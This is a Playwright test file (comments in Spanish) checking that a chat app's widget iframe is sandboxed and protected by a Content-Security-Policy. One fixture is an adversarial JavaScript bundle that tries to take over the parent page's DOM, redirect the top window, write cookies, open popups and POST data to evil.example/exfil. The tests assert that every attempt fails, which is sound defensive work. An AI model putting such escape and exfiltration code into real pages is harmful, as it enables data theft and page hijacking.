/**
 * US3 — Aislamiento visual y de ejecución del iframe del widget.
 *
 * Covers:
 *   T301 — sandbox="allow-scripts" + CSP meta tag en srcdoc (FR-008, R4)
 *   T302 — mensajes postMessage malformados son descartados silenciosamente
 *   T305 — bundle adversarial no puede escapar del sandbox (parent access,
 *           cookie theft, external fetch, top navigation)
 *
 * T306 (timeout de bootstrap) → widget-timeout.spec.ts
 *
 * Prerequisites: backend at http://127.0.0.1:8000 with MOCK_LLM_RESPONSES=true,
 * fixture connection seeded for E2E_SESSION_ID.
 */

import { test, expect, type Page } from "@playwright/test";
import { E2E_SESSION_ID } from "./global-setup";

const EXPECTED_SANDBOX = "allow-scripts";
const EXPECTED_CSP =
  "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'";
const EXPECTED_FORBIDDEN_FLAGS = [
  "allow-same-origin",
  "allow-top-navigation",
  "allow-forms",
  "allow-popups",
  "allow-modals",
];

async function gotoWithSession(page: Page, sessionId: string): Promise<void> {
  await page.addInitScript((sid) => {
    window.localStorage.setItem("joi_session_id", sid);
  }, sessionId);
  await page.goto("/");
}

async function sendMessage(page: Page, message: string): Promise<void> {
  const input = page.getByRole("textbox", { name: "Mensaje" });
  await input.fill(message);
  await page.getByRole("button", { name: "Enviar" }).click();
}

async function waitForAssistantReply(page: Page) {
  const log = page.getByRole("log");
  const bubble = log.locator('[data-role="assistant"]').last();
  await expect(bubble).toBeVisible({ timeout: 15000 });
  return bubble;
}

async function waitForWidgetFrame(page: Page) {
  const frame = page.locator('[data-role="widget-frame"]');
  await expect(frame).toBeVisible({ timeout: 10000 });
  return frame;
}

// ─── T301 ─────────────────────────────────────────────────────────────────────

test.describe("T301 — Sandbox y CSP del iframe del widget (FR-008, R4)", () => {
  test.beforeEach(async ({ page }) => {
    await gotoWithSession(page, E2E_SESSION_ID);
  });

  test("el iframe tiene sandbox='allow-scripts' exacto — sin flags adicionales", async ({ page }) => {
    await sendMessage(page, "muéstrame las ventas por mes");
    await waitForAssistantReply(page);
    await waitForWidgetFrame(page);

    const frame = page.locator('[data-role="widget-frame"]');
    const sandbox = await frame.getAttribute("sandbox");

    expect(sandbox?.trim()).toBe(EXPECTED_SANDBOX);
    for (const forbidden of EXPECTED_FORBIDDEN_FLAGS) {
      expect(sandbox).not.toContain(forbidden);
    }
  });

  test("el srcdoc del iframe incluye el meta CSP con la política correcta (R4)", async ({ page }) => {
    await sendMessage(page, "muéstrame las ventas por mes");
    await waitForAssistantReply(page);
    await waitForWidgetFrame(page);

    const srcdoc: string = await page.evaluate(() => {
      const el = document.querySelector('[data-role="widget-frame"]') as HTMLIFrameElement | null;
      return el?.srcdoc ?? "";
    });

    expect(srcdoc).toContain("Content-Security-Policy");
    expect(srcdoc).toContain(EXPECTED_CSP);
  });

  test("el srcdoc no contiene allow-same-origin ni allow-top-navigation en el atributo sandbox", async ({ page }) => {
    await sendMessage(page, "muéstrame las ventas por mes");
    await waitForAssistantReply(page);
    await waitForWidgetFrame(page);

    const sandbox = await page.locator('[data-role="widget-frame"]').getAttribute("sandbox");
    expect(sandbox).not.toContain("allow-same-origin");
    expect(sandbox).not.toContain("allow-top-navigation");
  });
});

// ─── T302 ─────────────────────────────────────────────────────────────────────

test.describe("T302 — Mensajes postMessage malformados son descartados (ADL-018)", () => {
  test("mensajes no conformes al protocolo no alteran el estado del canvas", async ({ page }) => {
    await gotoWithSession(page, E2E_SESSION_ID);

    await sendMessage(page, "muéstrame las ventas por mes");
    await waitForAssistantReply(page);

    // Wait for canvas to appear (bootstrapping or ready)
    await expect(page.locator('[data-role="canvas-panel"]')).toBeVisible({ timeout: 10000 });

    // Dispatch malformed messages from the host context — none should flip
    // the canvas to an error or unexpected state.
    await page.evaluate(() => {
      const junk: unknown[] = [
        null,
        42,
        "raw string",
        { type: "widget:ready" }, // missing protocol_version and extraction_id
        { type: "widget:ready", protocol_version: "v99", extraction_id: "x" }, // wrong version
        { type: "unknown:message", payload: {} },
        { type: "widget:error" }, // missing required fields
      ];
      for (const msg of junk) {
        window.postMessage(msg, "*");
      }
    });

    // Give the message loop time to process
    await page.waitForTimeout(300);

    // Canvas panel must still be present — no crash, no unexpected navigation
    await expect(page.locator('[data-role="canvas-panel"]')).toBeVisible();
    // No unhandled error dialog or JS error state
    await expect(page.locator('[data-role="widget-error"]')).toHaveCount(0);
  });
});

// ─── T305 ─────────────────────────────────────────────────────────────────────

test.describe("T305 — Bundle adversarial no puede escapar del sandbox (FR-008a)", () => {
  // This test intercepts the widget-runtime bundle with adversarial JS and
  // verifies that the host page is unaffected by the escape attempts.
  //
  // Adversarial patterns covered:
  //   A1 — parent.document access (SecurityError under opaque origin)
  //   A2 — window.top.location navigation (blocked by sandbox)
  //   A3 — document.cookie write (blocked: no allow-same-origin)
  //   A4 — fetch() to external domain (blocked by CSP connect-src 'none')
  //   A5 — window.open / alert loop (blocked: no allow-popups / allow-modals)
  const ADVERSARIAL_BUNDLE = `
(function () {
  // A1: try to overwrite host DOM
  try { parent.document.body.innerHTML = 'PWNED_A1'; } catch (e) {}
  // A2: try top-navigation (blocked by sandbox — no allow-top-navigation)
  try { window.top.location.href = 'https://evil.example/'; } catch (e) {}
  // A3: try to read/write host cookies (opaque origin — blocked)
  try { document.cookie = 'stolen=1; path=/'; } catch (e) {}
  // A4: external fetch (blocked by CSP connect-src 'none')
  try { fetch('https://evil.example/exfil', { method: 'POST', body: 'data' }); } catch (e) {}
  // A5: popup / modal abuse (no allow-popups, no allow-modals)
  try { window.open('https://evil.example/'); } catch (e) {}
  try { alert('XSS'); } catch (e) {}
  // Never emits widget:ready — host RENDER_TIMEOUT fires instead
})();
`;

  test("la app principal permanece intacta cuando el bundle es adversarial", async ({ page }) => {
    // Intercept any request to evil.example — fail test if one goes through
    let externalRequestMade = false;
    page.on("request", (req) => {
      if (req.url().includes("evil.example")) externalRequestMade = true;
    });

    // Intercept the widget-runtime bundle before the page loads
    await page.route("**/widget-runtime.bundle.js", (route) =>
      route.fulfill({
        status: 200,
        contentType: "application/javascript",
        body: ADVERSARIAL_BUNDLE,
      }),
    );

    await gotoWithSession(page, E2E_SESSION_ID);

    await sendMessage(page, "muéstrame las ventas por mes");
    await waitForAssistantReply(page);

    // Give the iframe time to execute the adversarial bundle
    await page.waitForTimeout(500);

    // A1: host DOM must not be 'PWNED_A1' in visible text.
    // Use innerText (not innerHTML) — innerHTML includes the iframe's srcdoc attribute
    // which contains the adversarial JS as a string literal, not as executed DOM.
    const bodyText = await page.evaluate(() => document.body.innerText);
    expect(bodyText).not.toContain("PWNED_A1");

    // A2: URL must still be on localhost (no top-navigation happened)
    expect(page.url()).toContain("127.0.0.1:3000");

    // A3: host cookies must not contain stolen=1
    const cookies = await page.context().cookies();
    const stolenCookie = cookies.find((c) => c.name === "stolen");
    expect(stolenCookie).toBeUndefined();

    // A4: no request to evil.example
    expect(externalRequestMade).toBe(false);

    // Host UI must still be functional
    await expect(page.locator('[data-role="canvas-panel"]')).toBeVisible();
    await expect(page.getByRole("textbox", { name: "Mensaje" })).toBeVisible();
  });

  test("el canvas muestra error de timeout (RENDER_TIMEOUT) tras el bundle adversarial", async ({ page }) => {
    await page.route("**/widget-runtime.bundle.js", (route) =>
      route.fulfill({
        status: 200,
        contentType: "application/javascript",
        body: ADVERSARIAL_BUNDLE,
      }),
    );

    await gotoWithSession(page, E2E_SESSION_ID);

    await sendMessage(page, "muéstrame las ventas por mes");
    await waitForAssistantReply(page);

    // BOOTSTRAP_TIMEOUT_MS = 4000; allow 6s total buffer
    await expect(page.locator('[data-role="widget-error"]')).toBeVisible({ timeout: 6000 });
    await expect(page.locator('[data-role="widget-error"]')).toContainText(
      /no respondió|RENDER_TIMEOUT/i,
    );
  });
});
